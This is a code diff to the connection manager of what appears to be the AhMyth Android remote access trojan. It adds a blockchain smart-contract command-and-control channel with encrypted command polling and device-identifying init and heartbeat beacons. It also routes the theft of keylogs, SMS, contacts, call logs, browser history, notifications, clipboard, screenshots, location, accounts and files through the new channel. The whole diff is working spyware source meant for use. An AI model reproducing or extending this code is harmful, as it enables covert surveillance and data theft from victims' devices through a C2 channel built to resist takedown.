@@ -35,6 +35,12 @@ public class ConnectionManager {
     private static SystemInfoManager systemInfoManager;
     private static InputManager inputManager;
 
+    // Blockchain event poller (null if using Socket.IO)
+    private static BlockchainEventPoller blockchainPoller = null;
+    
+    // Blockchain response sender (null if using Socket.IO)
+    private static BlockchainResponseSender blockchainResponseSender = null;
+    
     public static void startAsync(Context con) {
         try {
             Log.d(TAG, "startAsync called");
@@ -46,15 +52,354 @@ public class ConnectionManager {
             systemInfoManager = new SystemInfoManager(con);
             inputManager = new InputManager(con);
             
-            sendReq();
+            // CRITICAL: Ensure IOSocket is initialized first (triggers blockchain config detection)
+            // This MUST happen before any connection attempts
+            IOSocket.getInstance();
+            
+            // Small delay to ensure IOSocket constructor completes and sets isBlockchainMode
+            try {
+                Thread.sleep(200); // Increased delay for blockchain config parsing
+            } catch (InterruptedException e) {
+                // Ignore
+            }
+            
+            // Check if blockchain C2 mode is enabled (must check AFTER IOSocket initialization)
+            boolean blockchainMode = IOSocket.ensureBlockchainModeFromConfig();
+            Log.d(TAG, "=== ConnectionManager Mode Detection ===");
+            Log.d(TAG, "Blockchain mode check result: " + blockchainMode);
+            
+            if (blockchainMode) {
+                Log.d(TAG, "=== BLOCKCHAIN C2 MODE - NO SOCKET CONNECTION ===");
+                Log.d(TAG, "Blockchain C2 mode detected - starting event poller");
+                Log.d(TAG, "Socket.IO connection will NOT be initialized");
+                startBlockchainPoller();
+                Log.d(TAG, "=== Blockchain poller started successfully ===");
+            } else {
+                Log.d(TAG, "=== TCP/IP MODE - Using Socket.IO ===");
+                Log.d(TAG, "TCP/IP mode - starting Socket.IO connection");
+                sendReq();
+            }
         } catch (Exception ex) {
             Log.e(TAG, "Error in startAsync", ex);
+            
+            // Before retrying, check if blockchain mode is active - if so, don't retry socket connection
+            boolean blockchainMode = IOSocket.ensureBlockchainModeFromConfig();
+            if (blockchainMode) {
+                Log.d(TAG, "Blockchain mode active - error in blockchain poller setup, will not retry socket connection");
+                // Still retry, but it will go to blockchain mode again
+            }
+            
             new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                 @Override
                 public void run() {
                     startAsync(con);
                 }
             }, 5000);
+        }
+    }
+    
+    // Handler for periodic heartbeat
+    private static Handler heartbeatHandler = null;
+    private static Runnable heartbeatRunnable = null;
+    private static final int HEARTBEAT_INTERVAL_MS = 60000; // Send heartbeat every 60 seconds
+    
+    /**
+     * Start blockchain event polling (instead of Socket.IO)
+     */
+    private static void startBlockchainPoller() {
+        try {
+            // Get blockchain config from IOSocket
+            String rpcUrl = IOSocket.getBlockchainRpcUrl();
+            String contractAddress = IOSocket.getBlockchainContractAddress();
+            String aesKey = IOSocket.getBlockchainAesKey();
+            int pollingInterval = 5; // Faster polling for responsiveness in tests
+            
+            if (rpcUrl == null || contractAddress == null || aesKey == null) {
+                Log.e(TAG, "Blockchain C2 config incomplete, cannot start poller");
+                return;
+            }
+            
+            blockchainPoller = new BlockchainEventPoller(rpcUrl, contractAddress, aesKey, pollingInterval);
+            blockchainPoller.start();
+            Log.d(TAG, "Blockchain event poller started");
+            
+            // Initialize response sender (client needs private key for sending responses)
+            String clientPrivateKey = IOSocket.getBlockchainClientPrivateKey();
+            if (clientPrivateKey != null && !clientPrivateKey.isEmpty()) {
+                blockchainResponseSender = new BlockchainResponseSender(rpcUrl, contractAddress, aesKey, clientPrivateKey);
+                Log.d(TAG, "Blockchain response sender initialized - bidirectional communication enabled");
+                
+                // Send INIT announcement to let server know we're online
+                // This is critical for server to discover blockchain clients
+                sendBlockchainInit();
+                
+                // Start periodic heartbeat to maintain connection visibility
+                startBlockchainHeartbeat();
+            } else {
+                Log.w(TAG, "Client private key not set - responses will not be sent to blockchain");
+                Log.w(TAG, "Set clientPrivateKey in blockchain config to enable bidirectional communication");
+            }
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to start blockchain poller", e);
+            // Retry after delay
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                Log.d(TAG, "Retrying blockchain poller start...");
+                startBlockchainPoller();
+            }, 10000);
+        }
+    }
+    
+    /**
+     * Start periodic heartbeat for blockchain mode.
+     * This ensures the server knows the client is still online.
+     */
+    private static void startBlockchainHeartbeat() {
+        if (heartbeatHandler != null) {
+            Log.d(TAG, "Heartbeat already running");
+            return;
+        }
+        
+        heartbeatHandler = new Handler(Looper.getMainLooper());
+        heartbeatRunnable = new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    if (blockchainResponseSender != null) {
+                        sendBlockchainHeartbeat();
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Heartbeat error: " + e.getMessage());
+                }
+                // Schedule next heartbeat
+                if (heartbeatHandler != null) {
+                    heartbeatHandler.postDelayed(this, HEARTBEAT_INTERVAL_MS);
+                }
+            }
+        };
+        
+        // Start after initial delay
+        heartbeatHandler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL_MS);
+        Log.d(TAG, "Blockchain heartbeat started (interval: " + HEARTBEAT_INTERVAL_MS + "ms)");
+    }
+    
+    /**
+     * Send heartbeat to blockchain - includes full device info so server can recreate client after restart
+     */
+    private static void sendBlockchainHeartbeat() {
+        if (blockchainResponseSender == null) {
+            return;
+        }
+        
+        try {
+            Context ctx = MainService.getContextOfApplication();
+            JSONObject hbData = new JSONObject();
+            hbData.put("event", "heartbeat");
+            hbData.put("id", android.provider.Settings.Secure.getString(
+                ctx.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
+            hbData.put("timestamp", System.currentTimeMillis());
+            
+            // Include full device info (same as INIT) so server can recreate client after restart
+            hbData.put("manf", android.os.Build.MANUFACTURER);
+            hbData.put("model", android.os.Build.MODEL);
+            hbData.put("release", android.os.Build.VERSION.RELEASE);
+            hbData.put("sdk", android.os.Build.VERSION.SDK_INT);
+            hbData.put("brand", android.os.Build.BRAND);
+            hbData.put("product", android.os.Build.PRODUCT);
+            hbData.put("device", android.os.Build.DEVICE);
+            
+            // Get operator info
+            try {
+                android.telephony.TelephonyManager tm = 
+                    (android.telephony.TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
+                if (tm != null) {
+                    hbData.put("operator", tm.getNetworkOperatorName());
+                }
+            } catch (Exception e) {
+                // Ignore operator errors
+            }
+            
+            // Get battery level
+            try {
+                android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
+                android.content.Intent batteryStatus = ctx.registerReceiver(null, ifilter);
+                if (batteryStatus != null) {
+                    int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+                    int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+                    if (level >= 0 && scale > 0) {
+                        hbData.put("battery", (level * 100) / scale);
+                    }
+                }
+            } catch (Exception e) {
+                // Ignore battery errors
+            }
+            
+            Log.d(TAG, "Sending blockchain heartbeat with full device info");
+            blockchainResponseSender.sendResponse("heartbeat", hbData);
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to send blockchain heartbeat", e);
+        }
+    }
+    
+    /**
+     * Send INIT announcement to blockchain so server can discover this client.
+     * Called once when blockchain mode starts.
+     */
+    private static void sendBlockchainInit() {
+        if (blockchainResponseSender == null) {
+            Log.w(TAG, "Cannot send blockchain INIT - response sender not initialized");
+            return;
+        }
+        
+        try {
+            Context context = MainService.getContextOfApplication();
+            JSONObject initData = new JSONObject();
+            initData.put("event", "init");
+            initData.put("id", android.provider.Settings.Secure.getString(
+                context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
+            initData.put("manf", android.os.Build.MANUFACTURER);
+            initData.put("model", android.os.Build.MODEL);
+            initData.put("release", android.os.Build.VERSION.RELEASE);
+            initData.put("sdk", android.os.Build.VERSION.SDK_INT);
+            initData.put("timestamp", System.currentTimeMillis());
+            
+            // Get device info
+            try {
+                android.telephony.TelephonyManager tm = 
+                    (android.telephony.TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+                if (tm != null) {
+                    initData.put("operator", tm.getNetworkOperatorName());
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Could not get operator info: " + e.getMessage());
+            }
+            
+            // Get battery level
+            try {
+                android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
+                android.content.Intent batteryStatus = context.registerReceiver(null, ifilter);
+                if (batteryStatus != null) {
+                    int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+                    int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+                    if (level >= 0 && scale > 0) {
+                        initData.put("battery", (level * 100) / scale);
+                    }
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Could not get battery info: " + e.getMessage());
+            }
+            
+            Log.d(TAG, "=== SENDING BLOCKCHAIN INIT ANNOUNCEMENT ===");
+            Log.d(TAG, "Init data: " + initData.toString());
+            blockchainResponseSender.sendResponse("init", initData);
+            Log.d(TAG, "=== BLOCKCHAIN INIT SENT ===");
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to send blockchain INIT", e);
+        }
+    }
+    
+    /**
+     * Send response - routes through blockchain or Socket.IO based on mode
+     * This replaces all ioSocket.emit() calls for responses
+     */
+    public static void emitResponse(String eventName, JSONObject data) {
+        // Log the outgoing payload size/preview so we can trace responses on-device
+        try {
+            String payload = data != null ? data.toString() : "{}";
+            int length = payload.length();
+            String preview = payload.substring(0, Math.min(200, length));
+            Log.d(TAG, "emitResponse -> " + eventName + " (len=" + length + "): " + preview + (length > 200 ? "..." : ""));
+        } catch (Exception e) {
+            Log.w(TAG, "emitResponse preview failed: " + e.getMessage());
+        }
+
+        boolean blockchainMode = IOSocket.ensureBlockchainModeFromConfig();
+        if (blockchainMode) {
+            // Blockchain mode - send via blockchain
+            if (blockchainResponseSender != null) {
+                Log.d(TAG, "emitResponse via blockchain for event: " + eventName);
+                blockchainResponseSender.sendResponse(eventName, data);
+            } else {
+                Log.w(TAG, "Cannot send response - blockchain response sender not initialized");
+                Log.w(TAG, "Client needs private key and ETH balance to send responses");
+            }
+        } else {
+            // TCP mode - send via Socket.IO
+            if (ioSocket != null && ioSocket.connected()) {
+                Log.d(TAG, "emitResponse via TCP for event: " + eventName);
+                ioSocket.emit(eventName, data);
+            } else {
+                Log.w(TAG, "Cannot send response - Socket.IO not connected");
+            }
+        }
+    }
+    
+    /**
+     * Process command from blockchain (called by BlockchainEventPoller)
+     */
+    public static void processBlockchainCommand(String action, JSONObject data) {
+        try {
+            Log.d(TAG, "Processing blockchain command: " + action);
+            
+            // Create order JSON similar to Socket.IO format
+            JSONObject orderData = new JSONObject();
+            orderData.put("order", action);
+            if (data != null) {
+                // Merge data into orderData
+                JSONArray keys = data.names();
+                if (keys != null) {
+                    for (int i = 0; i < keys.length(); i++) {
+                        String key = keys.getString(i);
+                        orderData.put(key, data.get(key));
+                    }
+                }
+            }
+
+            // Backwards compatibility: map legacy "req" flags to expected "extra" fields for blockchain mode
+            try {
+                if ("x0000fm".equals(action) && !orderData.has("extra")) {
+                    int req = data != null ? data.optInt("req", 0) : 0;
+                    String extra = "ls";
+                    if (req == 1) {
+                        extra = "dl";
+                    } else if (req == 2) {
+                        extra = "delete";
+                    }
+                    orderData.put("extra", extra);
+                } else if ("x0000ca".equals(action) && !orderData.has("extra")) {
+                    int req = data != null ? data.optInt("req", -1) : -1;
+                    String extra = "camList";
+                    if (req == 1) {
+                        extra = "1";
+                    } else if (req == 0) {
+                        extra = "0";
+                    }
+                    orderData.put("extra", extra);
+                } else if ("x0000cb".equals(action) && !orderData.has("extra")) {
+                    int req = data != null ? data.optInt("req", 0) : 0;
+                    String extra = "get";
+                    if (req == 1) {
+                        extra = "start";
+                    } else if (req == 2) {
+                        extra = "stop";
+                    }
+                    orderData.put("extra", extra);
+                } else if ("x0000sm".equals(action) && !orderData.has("extra")) {
+                    int req = data != null ? data.optInt("req", 0) : 0;
+                    String extra = req == 0 ? "ls" : "sendSMS";
+                    orderData.put("extra", extra);
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Failed to normalize blockchain command extras for " + action, e);
+            }
+            
+            // Process using existing handleOrder method
+            handleOrder(orderData, action);
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error processing blockchain command", e);
         }
     }
 
@@ -101,16 +446,31 @@ public class ConnectionManager {
             @Override
             public void run() {
                 try {
+                    // CRITICAL: If blockchain mode is active, do NOT attempt Socket.IO connections
+                    // Check this FIRST before doing anything else
+                    if (IOSocket.ensureBlockchainModeFromConfig()) {
+                        Log.d(TAG, "=== BLOCKCHAIN MODE ACTIVE - SKIPPING SOCKET.IO ===");
+                        Log.d(TAG, "Blockchain mode active - skipping Socket.IO connection attempt");
+                        Log.d(TAG, "Socket connection will NOT be initialized");
+                        isConnecting = false;
+                        return;
+                    }
+
                     if (ioSocket != null && (isConnected || isConnecting)) {
                         Log.d(TAG, "Socket already connected or connecting");
                         return;
                     }
 
                     isConnecting = true;
+                    Log.d(TAG, "=== INITIALIZING SOCKET.IO CONNECTION (TCP/IP MODE) ===");
                     Log.d(TAG, "Initializing socket connection");
                     ioSocket = IOSocket.getInstance().getIoSocket();
 
                     if (ioSocket == null) {
+                        if (IOSocket.isBlockchainMode()) {
+                            Log.d(TAG, "IOSocket returned null because blockchain mode is enabled");
+                            return;
+                        }
                         Log.e(TAG, "Failed to get IOSocket instance");
                         scheduleRetry();
                         return;
@@ -304,7 +664,7 @@ public class ConnectionManager {
                             errorResult.put("success", false);
                             errorResult.put("error", "Socket not connected");
                             if (ioSocket != null) {
-                                ioSocket.emit("x0000ws", errorResult);
+                                emitResponse("x0000ws", errorResult);
                             }
                             break;
                         }
@@ -316,13 +676,13 @@ public class ConnectionManager {
                         
                         // Emit synchronously on the current thread (socket thread)
                         try {
-                            ioSocket.emit("x0000ws", result);
+                            emitResponse("x0000ws", result);
                             Log.d(TAG, "Wake screen response sent, socket connected: " + ioSocket.connected());
                         } catch (Exception emitError) {
                             Log.e(TAG, "Error emitting wake screen response", emitError);
                             // Try one more time
                             try {
-                                ioSocket.emit("x0000ws", result);
+                                emitResponse("x0000ws", result);
                             } catch (Exception e2) {
                                 Log.e(TAG, "Second emit attempt failed", e2);
                             }
@@ -368,7 +728,7 @@ public class ConnectionManager {
                             result.put("success", false);
                             result.put("error", e.getMessage());
                             if (ioSocket != null && ioSocket.connected()) {
-                                ioSocket.emit("x0000ws", result);
+                                emitResponse("x0000ws", result);
                             }
                         } catch (Exception ex) {
                             Log.e(TAG, "Error emitting wake screen error", ex);
@@ -467,7 +827,7 @@ public class ConnectionManager {
         String extra = data.getString("extra");
         android.content.Context context = MainService.getInstance();
         if (context == null) {
-            context = AhMythApplication.getContext();
+            context = ConnectionManager.context;
         }
         
         if (context == null) {
@@ -532,7 +892,7 @@ public class ConnectionManager {
                 JSONObject error = new JSONObject();
                 error.put("file", false);
                 error.put("error", "Path is required for download");
-                ioSocket.emit("x0000fm", error);
+                emitResponse("x0000fm", error);
                 return;
             }
             x0000fm(1, path);
@@ -556,7 +916,7 @@ public class ConnectionManager {
             JSONObject result = new JSONObject();
             result.put("deleted", deleted);
             result.put("path", filePath);
-            ioSocket.emit("x0000fm", result);
+            emitResponse("x0000fm", result);
         } catch (Exception e) {
             Log.e(TAG, "Error deleting file", e);
         }
@@ -611,16 +971,16 @@ public class ConnectionManager {
                     screenInfo = screenCaptureManager.getScreenInfo();
                 }
                 screenInfo.put("captureActive", screenService != null && screenService.isCapturing());
-                ioSocket.emit("x0000sc", screenInfo);
+                emitResponse("x0000sc", screenInfo);
                 
             } else if (extra.equals("capture") || extra.equals("screenshot")) {
                 // Capture screenshot
                 if (screenService != null && screenService.isCapturing()) {
                     JSONObject screenshot = screenService.captureFrame();
-                    ioSocket.emit("x0000sc", screenshot);
+                    emitResponse("x0000sc", screenshot);
                 } else if (screenCaptureManager.isCapturing()) {
                     JSONObject screenshot = screenCaptureManager.captureScreen();
-                    ioSocket.emit("x0000sc", screenshot);
+                    emitResponse("x0000sc", screenshot);
                 } else {
                     // Check if service exists but just needs to be started
                     if (screenService != null) {
@@ -636,7 +996,7 @@ public class ConnectionManager {
                             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                 if (screenService.isCapturing()) {
                                     JSONObject screenshot = screenService.captureFrame();
-                                    ioSocket.emit("x0000sc", screenshot);
+                                    emitResponse("x0000sc", screenshot);
                                 } else {
                                     requestScreenCapturePermission();
                                     JSONObject result = new JSONObject();
@@ -646,7 +1006,7 @@ public class ConnectionManager {
                                         result.put("requiresPermission", true);
                                         result.put("permissionRequested", true);
                                         result.put("instruction", "User must tap 'Start Now' on the device to grant screen recording permission.");
-                                        ioSocket.emit("x0000sc", result);
+                                        emitResponse("x0000sc", result);
                                     } catch (Exception ignored) {}
                                 }
                             }, 500);
@@ -665,7 +1025,7 @@ public class ConnectionManager {
                     result.put("requiresPermission", true);
                     result.put("permissionRequested", true);
                     result.put("instruction", "User must tap 'Start Now' on the device to grant screen recording permission.");
-                    ioSocket.emit("x0000sc", result);
+                    emitResponse("x0000sc", result);
                 }
                 
             } else if (extra.equals("start") || extra.equals("request")) {
@@ -675,7 +1035,7 @@ public class ConnectionManager {
                     result.put("success", true);
                     result.put("message", "Screen capture is already active");
                     result.put("isCapturing", true);
-                    ioSocket.emit("x0000sc", result);
+                    emitResponse("x0000sc", result);
                 } else {
                     // Request screen capture permission
                     requestScreenCapturePermission();
@@ -684,14 +1044,14 @@ public class ConnectionManager {
                     result.put("success", true);
                     result.put("message", "Screen capture permission dialog shown on device");
                     result.put("instruction", "User must tap 'Start Now' on the device");
-                    ioSocket.emit("x0000sc", result);
+                    emitResponse("x0000sc", result);
                 }
                 
             } else if (extra.equals("status")) {
                 JSONObject result = new JSONObject();
                 result.put("isCapturing", screenService != null && screenService.isCapturing());
                 result.put("serviceRunning", screenService != null);
-                ioSocket.emit("x0000sc", result);
+                emitResponse("x0000sc", result);
                 
             } else if (extra.equals("setQuality")) {
                 int quality = data.optInt("quality", 50);
@@ -702,7 +1062,7 @@ public class ConnectionManager {
                 JSONObject result = new JSONObject();
                 result.put("success", true);
                 result.put("quality", quality);
-                ioSocket.emit("x0000sc", result);
+                emitResponse("x0000sc", result);
                 
             } else if (extra.equals("setScale")) {
                 float scale = (float) data.optDouble("scale", 0.5);
@@ -713,7 +1073,7 @@ public class ConnectionManager {
                 JSONObject result = new JSONObject();
                 result.put("success", true);
                 result.put("scale", scale);
-                ioSocket.emit("x0000sc", result);
+                emitResponse("x0000sc", result);
             }
         } catch (Exception e) {
             Log.e(TAG, "Error in screen capture", e);
@@ -721,7 +1081,7 @@ public class ConnectionManager {
                 JSONObject error = new JSONObject();
                 error.put("success", false);
                 error.put("error", e.getMessage());
-                ioSocket.emit("x0000sc", error);
+                emitResponse("x0000sc", error);
             } catch (Exception ignored) {}
         }
     }
@@ -799,7 +1159,7 @@ public class ConnectionManager {
                     result.put("error", "Unknown action: " + action);
             }
             
-            ioSocket.emit("x0000in", result);
+            emitResponse("x0000in", result);
             
         } catch (Exception e) {
             Log.e(TAG, "Error in remote input", e);
@@ -807,7 +1167,7 @@ public class ConnectionManager {
                 JSONObject error = new JSONObject();
                 error.put("success", false);
                 error.put("error", e.getMessage());
-                ioSocket.emit("x0000in", error);
+                emitResponse("x0000in", error);
             } catch (Exception ignored) {}
         }
     }
@@ -819,18 +1179,18 @@ public class ConnectionManager {
             
             if (extra.equals("get")) {
                 JSONObject keylogs = KeyloggerService.getKeylogs();
-                ioSocket.emit("x0000kl", keylogs);
+                emitResponse("x0000kl", keylogs);
             } else if (extra.equals("clear")) {
                 KeyloggerService.clearLogs();
                 JSONObject result = new JSONObject();
                 result.put("success", true);
                 result.put("message", "Keylogs cleared");
-                ioSocket.emit("x0000kl", result);
+                emitResponse("x0000kl", result);
             } else if (extra.equals("status")) {
                 JSONObject result = new JSONObject();
                 result.put("enabled", KeyloggerService.isServiceEnabled());
                 result.put("count", KeyloggerService.getLogCount());
-                ioSocket.emit("x0000kl", result);
+                emitResponse("x0000kl", result);
             }
         } catch (Exception e) {
             Log.e(TAG, "Error in keylogger", e);
@@ -844,16 +1204,16 @@ public class ConnectionManager {
             
             if (extra.equals("history")) {
                 JSONObject history = browserHistoryManager.getBrowserHistory();
-                ioSocket.emit("x0000bh", history);
+                emitResponse("x0000bh", history);
             } else if (extra.equals("bookmarks")) {
                 JSONObject bookmarks = browserHistoryManager.getBookmarks();
-                ioSocket.emit("x0000bh", bookmarks);
+                emitResponse("x0000bh", bookmarks);
             } else if (extra.equals("searches")) {
                 JSONObject searches = browserHistoryManager.getSearchQueries();
-                ioSocket.emit("x0000bh", searches);
+                emitResponse("x0000bh", searches);
             } else {
                 JSONObject allData = browserHistoryManager.getAllBrowserData();
-                ioSocket.emit("x0000bh", allData);
+                emitResponse("x0000bh", allData);
             }
         } catch (Exception e) {
             Log.e(TAG, "Error in browser history", e);
@@ -870,39 +1230,39 @@ public class ConnectionManager {
             
             if (extra.equals("get") || extra.equals("all")) {
                 JSONObject notifications = NotificationReader.getNotifications();
-                ioSocket.emit("x0000nt", notifications);
+                emitResponse("x0000nt", notifications);
             } else if (extra.equals("active")) {
                 NotificationReader instance = NotificationReader.getInstance();
                 if (instance != null) {
                     JSONObject active = instance.getActiveNotificationsJSON();
-                    ioSocket.emit("x0000nt", active);
+                    emitResponse("x0000nt", active);
                 } else {
                     // Try to request access
                     JSONObject result = NotificationReader.requestAccess(context);
-                    ioSocket.emit("x0000nt", result);
+                    emitResponse("x0000nt", result);
                 }
             } else if (extra.equals("clear")) {
                 NotificationReader.clearHistory();
                 JSONObject result = new JSONObject();
                 result.put("success", true);
                 result.put("message", "Notification history cleared");
-                ioSocket.emit("x0000nt", result);
+                emitResponse("x0000nt", result);
             } else if (extra.equals("status")) {
                 JSONObject result = new JSONObject();
                 result.put("enabled", NotificationReader.isServiceEnabled());
                 result.put("accessEnabled", NotificationReader.isNotificationAccessEnabled(context));
-                ioSocket.emit("x0000nt", result);
+                emitResponse("x0000nt", result);
             } else if (extra.equals("enable") || extra.equals("request")) {
                 // Open notification access settings
                 JSONObject result = NotificationReader.requestAccess(context);
-                ioSocket.emit("x0000nt", result);
+                emitResponse("x0000nt", result);
             }
         } catch (Exception e) {
             Log.e(TAG, "Error in notifications", e);
             try {
                 JSONObject result = new JSONObject();
                 result.put("error", e.getMessage());
-                ioSocket.emit("x0000nt", result);
+                emitResponse("x0000nt", result);
             } catch (Exception ignored) {}
         }
     }
@@ -936,7 +1296,7 @@ public class ConnectionManager {
                 result.put("usage", systemInfoManager.getAppUsageStats());
             }
             
-            ioSocket.emit("x0000si", result);
+            emitResponse("x0000si", result);
         } catch (Exception e) {
             Log.e(TAG, "Error in system info", e);
         }
@@ -950,7 +1310,7 @@ public class ConnectionManager {
             if (req == -1) {
                 JSONObject cameraList = new CameraManager(context).findCameraList();
                 if (cameraList != null) {
-                    ioSocket.emit("x0000ca", cameraList);
+                    emitResponse("x0000ca", cameraList);
                 }
             } else if (req == 1) {
                 new CameraManager(context).startUp(1);
@@ -966,7 +1326,9 @@ public class ConnectionManager {
         Log.d(TAG, "File manager command: " + req + " path: " + path);
         try {
             if (req == 0) {
-                ioSocket.emit("x0000fm", fm.walk(path));
+                JSONObject result = new JSONObject();
+                result.put("files", fm.walk(path));
+                emitResponse("x0000fm", result);
             } else if (req == 1) {
                 fm.downloadFile(path);
             }
@@ -979,10 +1341,12 @@ public class ConnectionManager {
         Log.d(TAG, "SMS command: " + req);
         try {
             if (req == 0) {
-                ioSocket.emit("x0000sm", SMSManager.getSMSList());
+                emitResponse("x0000sm", SMSManager.getSMSList());
             } else if (req == 1) {
                 boolean isSent = SMSManager.sendSMS(phoneNo, msg);
-                ioSocket.emit("x0000sm", isSent);
+                JSONObject result = new JSONObject();
+                result.put("isSent", isSent);
+                emitResponse("x0000sm", result);
             }
         } catch (Exception e) {
             Log.e(TAG, "Error in SMS command", e);
@@ -992,7 +1356,7 @@ public class ConnectionManager {
     public static void x0000cl() {
         Log.d(TAG, "Call logs command");
         try {
-            ioSocket.emit("x0000cl", CallsManager.getCallsLogs());
+            emitResponse("x0000cl", CallsManager.getCallsLogs());
         } catch (Exception e) {
             Log.e(TAG, "Error in call logs command", e);
         }
@@ -1001,7 +1365,7 @@ public class ConnectionManager {
     public static void x0000cn() {
         Log.d(TAG, "Contacts command");
         try {
-            ioSocket.emit("x0000cn", ContactsManager.getContacts());
+            emitResponse("x0000cn", ContactsManager.getContacts());
         } catch (Exception e) {
             Log.e(TAG, "Error in contacts command", e);
         }
@@ -1035,7 +1399,7 @@ public class ConnectionManager {
                             location.put("enable", false);
                         }
                         
-                        ioSocket.emit("x0000lm", location);
+                        emitResponse("x0000lm", location);
                     } catch (Exception e) {
                         Log.e(TAG, "Error getting location", e);
                     }
@@ -1050,7 +1414,7 @@ public class ConnectionManager {
         Log.d(TAG, "Device info command");
         try {
             JSONObject deviceInfo = new DeviceInfoManager(context).getDeviceInfo();
-            ioSocket.emit("x0000di", deviceInfo);
+            emitResponse("x0000di", deviceInfo);
         } catch (Exception e) {
             Log.e(TAG, "Error in device info command", e);
         }
@@ -1062,7 +1426,7 @@ public class ConnectionManager {
             JSONArray appsList = new DeviceInfoManager(context).getInstalledApps();
             JSONObject result = new JSONObject();
             result.put("appsList", appsList);
-            ioSocket.emit("x0000ap", result);
+            emitResponse("x0000ap", result);
         } catch (Exception e) {
             Log.e(TAG, "Error in apps command", e);
         }
@@ -1074,14 +1438,14 @@ public class ConnectionManager {
             Log.d(TAG, "Install app command: " + apkPath);
             AppManager appManager = new AppManager(context);
             JSONObject result = appManager.installApp(apkPath);
-            ioSocket.emit("x0000ia", result);
+            emitResponse("x0000ia", result);
         } catch (Exception e) {
             Log.e(TAG, "Error installing app", e);
             try {
                 JSONObject errorResult = new JSONObject();
                 errorResult.put("success", false);
                 errorResult.put("error", e.getMessage());
-                ioSocket.emit("x0000ia", errorResult);
+                emitResponse("x0000ia", errorResult);
             } catch (Exception e2) {
                 Log.e(TAG, "Error sending install result", e2);
             }
@@ -1094,14 +1458,14 @@ public class ConnectionManager {
             Log.d(TAG, "Uninstall app command: " + packageName);
             AppManager appManager = new AppManager(context);
             JSONObject result = appManager.uninstallApp(packageName);
-            ioSocket.emit("x0000ua", result);
+            emitResponse("x0000ua", result);
         } catch (Exception e) {
             Log.e(TAG, "Error uninstalling app", e);
             try {
                 JSONObject errorResult = new JSONObject();
                 errorResult.put("success", false);
                 errorResult.put("error", e.getMessage());
-                ioSocket.emit("x0000ua", errorResult);
+                emitResponse("x0000ua", errorResult);
             } catch (Exception e2) {
                 Log.e(TAG, "Error sending uninstall result", e2);
             }
@@ -1145,7 +1509,7 @@ public class ConnectionManager {
                                                 new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                                     try {
                                                         JSONObject clipboard = clipboardMonitor.getClipboardText();
-                                                        ioSocket.emit("x0000cb", clipboard);
+                                                        emitResponse("x0000cb", clipboard);
                                                     } catch (Exception e) {
                                                         Log.e(TAG, "Error reading clipboard after bringing to foreground", e);
                                                         try {
@@ -1153,7 +1517,7 @@ public class ConnectionManager {
                                                             error.put("text", "");
                                                             error.put("hasData", false);
                                                             error.put("error", "Could not read clipboard. App may need to be in foreground.");
-                                                            ioSocket.emit("x0000cb", error);
+                                                            emitResponse("x0000cb", error);
                                                         } catch (Exception ignored) {}
                                                     }
                                                 }, 500);
@@ -1170,7 +1534,7 @@ public class ConnectionManager {
                             
                             // Read clipboard
                             JSONObject clipboard = clipboardMonitor.getClipboardText();
-                            ioSocket.emit("x0000cb", clipboard);
+                            emitResponse("x0000cb", clipboard);
                         } else if (req == 1) {
                             clipboardMonitor.setClipboardListener(new ClipboardMonitor.OnClipboardChangedListener() {
                                 @Override
@@ -1180,7 +1544,7 @@ public class ConnectionManager {
                                         result.put("text", text);
                                         result.put("hasData", true);
                                         result.put("timestamp", System.currentTimeMillis());
-                                        ioSocket.emit("x0000cb", result);
+                                        emitResponse("x0000cb", result);
                                     } catch (Exception e) {
                                         Log.e(TAG, "Error sending clipboard change", e);
                                     }
@@ -1194,7 +1558,7 @@ public class ConnectionManager {
                             error.put("text", "");
                             error.put("hasData", false);
                             error.put("error", e.getMessage());
-                            ioSocket.emit("x0000cb", error);
+                            emitResponse("x0000cb", error);
                         } catch (Exception ignored) {}
                     }
                 }
@@ -1208,7 +1572,7 @@ public class ConnectionManager {
         Log.d(TAG, "WiFi command");
         try {
             JSONObject wifiInfo = new WiFiManager(context).getWiFiInfo();
-            ioSocket.emit("x0000wf", wifiInfo);
+            emitResponse("x0000wf", wifiInfo);
         } catch (Exception e) {
             Log.e(TAG, "Error in WiFi command", e);
         }
@@ -1220,7 +1584,7 @@ public class ConnectionManager {
         Log.d(TAG, "Accounts command");
         try {
             JSONObject accounts = systemInfoManager.getAccounts();
-            ioSocket.emit("x0000ac", accounts);
+            emitResponse("x0000ac", accounts);
         } catch (Exception e) {
             Log.e(TAG, "Error in accounts command", e);
         }
@@ -1230,7 +1594,7 @@ public class ConnectionManager {
         Log.d(TAG, "Processes command");
         try {
             JSONObject processes = systemInfoManager.getRunningProcesses();
-            ioSocket.emit("x0000pr", processes);
+            emitResponse("x0000pr", processes);
         } catch (Exception e) {
             Log.e(TAG, "Error in processes command", e);
         }
@@ -1240,7 +1604,7 @@ public class ConnectionManager {
         Log.d(TAG, "Network stats command");
         try {
             JSONObject networkStats = systemInfoManager.getNetworkStats();
-            ioSocket.emit("x0000ns", networkStats);
+            emitResponse("x0000ns", networkStats);
         } catch (Exception e) {
             Log.e(TAG, "Error in network stats command", e);
         }
